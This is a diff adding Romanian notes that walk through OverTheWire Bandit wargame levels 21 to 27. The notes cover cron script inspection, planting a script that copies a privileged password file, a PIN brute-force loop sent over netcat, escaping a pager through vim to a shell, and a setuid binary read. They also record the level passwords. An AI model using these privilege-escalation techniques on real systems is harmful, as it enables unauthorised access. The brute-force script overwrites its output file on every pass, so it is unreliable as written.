@@ -107,3 +107,82 @@ __GbKksEFF4yrVs6il55v6gwY5aVje5f0j__
 		   (de pe primul terminal scriu parola pt bandit 20, adica cea mai sus)	;
 		   (obtin parola pe al doilea terminal);
 		   __gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr__
+
+## Ziua 6 (21.06)
+
+21->22 := m-am uitat la: [link](https://www.youtube.com/watch?v=UlVqobmcPuM&ab_channel=OneByteAtATime) , [link](https://www.youtube.com/watch?v=v952m13p-b4&t=56s&ab_channel=Linode).
+
+		  cd /etc/cron.d
+		  cat cronjob_bandit22
+		  cat /usr/bin/cronjob_bandit22.sh
+		  cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+		  Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+		  (m-am uitat in scriptul care ruleaza si am luat fisierul in care se scria outputul)
+		  
+22->23 := comenzi
+
+		  cd /etc/cron.d
+		  cat cronjob_bandit23
+          cat /usr/bin/cronjob_bandit23.sh
+		  echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+          cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+		  jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+		  (m-am uitat in scriptul care se ruleaza si am accesat fisierul in care se salveaza parola cautata)
+		  
+23->24 := comenzi
+
+		  cd /etc/cron.d
+	      cat cronjob_bandit24
+		  cat /usr/bin/cronjob_bandit24.sh
+		  (dupa analizarea scriptului, observam ca putem crea un script care sa citeasca parola aferenta contului bandit24, deoarece noi nu avem permisiunea sa o citim direct)
+		  (creeam un folder in /tmp pentru a putea scrie scriptul)
+		  mkdir /tmp/work
+		  cd /tmp/work
+		  nano s.sh
+		  ------------
+		  #!/bin/bash
+		  cat /etc/bandit_pass/bandit24 > /tmp/work/pass
+	      ----------------------
+		  touch pass
+		  chmod 777 -R /tmp/work (dam permisiuni de executie)
+		  cp s.sh /var/spool/bandit24
+		  (dupa aprox un minut parola este disponibil in fisierul pass)
+		  UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+24->25 := 
+#!/bin/bash
+
+pass=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+num_list=(0 1 2 3 4 5 6 7 8 9)
+```
+for i1 in ${num_list[@]}
+do
+	for i2 in ${num_list[@]}
+	do
+		for i3 in ${num_list[@]}
+		do
+			for i4 in ${num_list[@]}
+			do
+				pin=$i1$i2$i3$i4
+				echo "$pass $pin" > fis.txt
+			done
+		done
+	done
+done
+```	
+		  nc localhost 30002 < fis.txt
+		  uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+		  
+25->26 := (trebuie sa micsoram terminalul pentru a se putea executa comanda "more"0)
+
+		  ssh -i bandit26.sshkey bandit26@localhost
+		  (apasam pe "v" pentru a porni editorul de text vim)
+		  :set shell? (pt a edea ce shell se foloseste)
+		  :set shell=/bin/bash
+		  :shell
+		  cat /etc/bandit_pass/bandit26
+		  5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+		  
+26->27 := ./bandit27-do cat /etc/bandit_pass/bandit27
+
+		  3ba3118a22e93127a4ed485be72ef5ea
